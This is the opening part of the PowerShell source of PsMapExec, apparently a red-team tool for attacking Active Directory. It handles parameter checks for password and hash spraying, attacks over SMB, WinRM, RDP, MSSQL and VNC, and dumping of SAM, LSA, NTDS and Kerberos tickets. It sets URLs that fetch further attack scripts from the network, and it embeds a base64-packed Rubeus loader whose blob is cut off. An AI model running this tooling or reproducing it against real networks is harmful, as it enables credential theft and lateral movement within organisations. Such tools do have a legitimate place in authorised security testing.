Function PsMapExec{


[CmdletBinding()]
Param(
    [Parameter(Mandatory=$False, Position=0, ValueFromPipeline=$true)]
    [String]$Command = '',

    [Parameter(Mandatory=$False, Position=1, ValueFromPipeline=$true)]
    [String]$Targets = '',

    [Parameter(Mandatory=$False, Position=2, ValueFromPipeline=$true)]
    [String]$Domain = "$env:USERDNSDOMAIN",

    [Parameter(Mandatory=$False, Position=3, ValueFromPipeline=$true)]
    [String]$Username = "",

    [Parameter(Mandatory=$True, Position=4, ValueFromPipeline=$true)]
    [String]$Method = "",

    [Parameter(Mandatory=$False, Position=5, ValueFromPipeline=$true)]
    [String]$Module = "",

    [Parameter(Mandatory=$False, Position=6, ValueFromPipeline=$true)]
    [String]$Hash = "",

    [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
    [String]$Password = "",

    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
    [String]$UserDomain = "",

    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
    [String]$LocalFileServer = "",

    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
    [String]$Threads = "8",

    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
    [switch]$Force,

    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
    [switch]$LocalAuth,
    
    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
    [switch]$CurrentUser = $True,

    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
    [switch]$SuccessOnly,

    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
    [switch]$ShowOutput,

    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
    [String]$Ticket = "",

    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
    [Switch]$AccountAsPassword,

    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
    [Switch]$EmptyPassword,

    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
    [int]$Port = "",

    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
    [Switch]$NoParse,

    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
    [String]$SprayHash = "",

    [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
    [String]$SprayPassword = ""
)

# Check for mandatory parameter


$startTime = Get-Date
Set-Variable MaximumHistoryCount 32767

# Set the targets variable if not provided when spraying
if ($Method -eq "Spray" -and $Targets -eq ""){
$Targets = "all"
}

################################################################################################################
###################################### Banner and version information ##########################################
################################################################################################################

$Banner = @("
  _____   _____ __  __          _____  ________   ________ _____ 
 |  __ \ / ____|  \/  |   /\   |  __ \|  ____\ \ / /  ____/ ____|
 | |__) | (___ | \  / |  /  \  | |__) | |__   \ V /| |__ | |     
 |  ___/ \___ \| |\/| | / /\ \ |  ___/|  __|   > < |  __|| |     
 | |     ____) | |  | |/ ____ \| |    | |____ / . \| |___| |____ 
 |_|    |_____/|_|  |_/_/    \_\_|    |______/_/ \_\______\_____|
                                                                 
")

Write-Output $Banner
Write-Host "Github  : "  -NoNewline
Write-Host "https://github.com/The-Viper-One"
Write-Host "Version : " -NoNewline
Write-Host "0.4.3"
Write-Host

# If no targets have been provided
if (-not $Targets -and $Method -ne "Spray") {
    Write-host "[-]  " -ForegroundColor "Red" -NoNewline
    Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
    return
}



################################################################################################################
####################################### Some logic based checking ##############################################
################################################################################################################

if ($Threads -lt 2){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Threads value should not be less than 2"
        return
}



$DomainJoined = $True
try {[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain() | Out-Null } Catch {$DomainJoined = $False}

if (!$DomainJoined -and $CurrentUser){
    Write-Host "[-] " -ForegroundColor "Yellow" -NoNewline
    Write-host "The switch -CurrentUser is not applicable when on a non-domain joined system"
    return
}

if ($Domain -eq "" -and $DomainJoined -eq $False){
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-host "This system appears to be a non-domain joined system. You must specify a target Domain ""-Domain Security.local"""
    return
}

if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne ""){$CurrentUser = $False}
if ($Method -eq "Spray" -and $DomainJoined -eq $True){$CurrentUser = $True}
if ($Method -eq "GenRelayList"){$CurrentUser = $True}
if ($Method -eq "RDP"){$CurrentUser = $True}
if ($Method -eq "MSSQL"){$CurrentUser = $True}



if ($Method -eq ""  -and !$SessionHunter -and !$Spray){
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "No method specified"
        return
}


if ($Method -eq "RDP") {
    if ($Hash -ne "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Hash authentication not currently supported with RDP"
        return
    }
    
    if ($Ticket -ne "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Ticket authentication not currently supported with RDP"
        return
    }
    
    if ($Username -eq "" -or $Password -eq "") {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "-Username and -Password parameters required when using the method RDP"
        return
    }
}





if ($Method -eq "VNC") {
    if ($Username -ne "" -or $Password -ne "" -or $Hash -ne "" -or $Ticket -ne "") {
        $CurrentUser = $True
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host " Method VNC does not support authentication material, it simply checks if No Auth is enabled."
        Write-Host
        Start-sleep -Seconds 5
    }
 } 

if ($Method -eq "Spray"){

if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "We need something to spray"
Write-Host
Write-host "PsMapExec -Method Spray -SprayPassword [Password]"
Write-host "PsMapExec -Method Spray -SprayHash [Hash]"
Write-host "PsMapExec -Method Spray -AccountAsPassword"
Write-host "PsMapExec -Method Spray -EmptyPassword"
return

}

if ($SprayHash -ne "" -and $SprayPassword -ne ""){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Hash and Password detected"
return

}

if ($EmptyPassword -and $SprayHash -ne "" -or ($EmptyPassword -and $SprayPassword -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return

}

if ($AccountAsPassword -and $SprayHash -ne "" -or ($AccountAsPassword -and $SprayPassword -ne "")){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Password or hash value provided with -EmptyPassword"
return

}

if ($AccountAsPassword -and $EmptyPassword){
Write-Host "[-] " -ForegroundColor "Red" -NoNewline
Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
return
    
    }
}

if ($Method -eq "WinRM" -and !$DomainJoined){
Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "Be aware, using WinRM from a non-domain joined system typically does not work"

Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "This is default and expected behaviour. This system will need to be configured as a trusted host on the remote system to allow access"
}

if ($Method -eq "MSSQL" -and $LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Looks like you are missing either -Username or -Password"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
    return
}

if ($Method -eq "MSSQL" -and !$LocalAuth -and (($Username -eq "" -and $Password -ne "") -or ($Username -ne "" -and $Password -eq ""))) {
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Looks like you are missing either -Username or -Password"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Do not provide a -Username or -Password if you want to check with current user context"
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "You can append -LocalAuth if you wish to authenticate with a -Username and -Password as SQL Authentication"
    return
}


# Check script modules
$InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyContinue"

################################################################################################################
######################################### External Script variables ############################################
################################################################################################################

$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
$KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
$NTDSURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NTDS.ps1"

# Check if $LocalFileServer is not NULL
if (![string]::IsNullOrEmpty($LocalFileServer)) {
    # Regular expression pattern to validate an IP address
    $ipRegex = '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'

    if ($LocalFileServer -match $ipRegex) {
        # Update URLs to use the provided local file server's IP address
        $PandemoniumURL = "http://$LocalFileServer/Invoke-Pandemonium.ps1"
        $KirbyURL = "http://$LocalFileServer/Kirby.ps1"
    }
    else {
        # If $LocalFileServer is not a valid IP address, show an error message and return
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "The provided value '$LocalFileServer' is not a valid IP address."
        return
    }
}



################################################################################################################
########################################### Initial Directory Setup ############################################
################################################################################################################

$WorkingDirectory = (Get-Item -Path ".\").FullName

try {
    $testFilePath = Join-Path $WorkingDirectory "Test.PME"
    New-Item -ItemType "File" -Name "Test.PME" -Path $WorkingDirectory -Force -ErrorAction "Stop" | Out-Null
    Remove-Item -Path $testFilePath -Force | Out-Null
} catch {
    Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Current directory is not writable, change to a different directory and try again"
    return
}

$PME = Join-Path $WorkingDirectory "PME"
$SAM = Join-Path $PME "SAM"
$MSSQL = Join-Path $PME "MSSQL"
$LogonPasswords = Join-Path $PME "LogonPasswords"
$SMB = Join-Path $PME "SMB"
$Tickets = Join-Path $PME "Tickets"
$KerbDump = Join-Path $Tickets "KerbDump"
$MimiTickets = Join-Path $Tickets "MimiTickets"
$ekeys = Join-Path $PME "eKeys"
$LSA = Join-Path $PME "LSA"
$ConsoleHistory = Join-Path $PME "Console History"
$Sessions = Join-Path "$PME" "Sessions"
$UserFiles = Join-Path "$PME" "User Files"
$Spraying = Join-Path $PME "Spraying"
$VNC = Join-Path $PME "VNC"
$NTDS = Join-Path $PME "NTDS"

  $directories = @(
    $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
    $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
    $UserFiles, $Spraying, $VNC, $NTDS
)

foreach ($directory in $directories) {
    if (-not (Test-Path $directory)) {
        New-Item -ItemType Directory -Force -Path $directory | Out-Null
        if ($directory -eq $PME) {
            Write-Host "[+] " -ForegroundColor "Green" -NoNewline
            Write-Host "Created directory for PME at $directory"
            Write-Host
            Start-sleep -seconds "3"
        }
    }
}

################################################################################################################
################################### Loads ticket functions into memory #########################################
################################################################################################################

if ($InvokeRubeusLoaded.Name -ne "Invoke-Rubeus"){
function Invoke-Rubeus{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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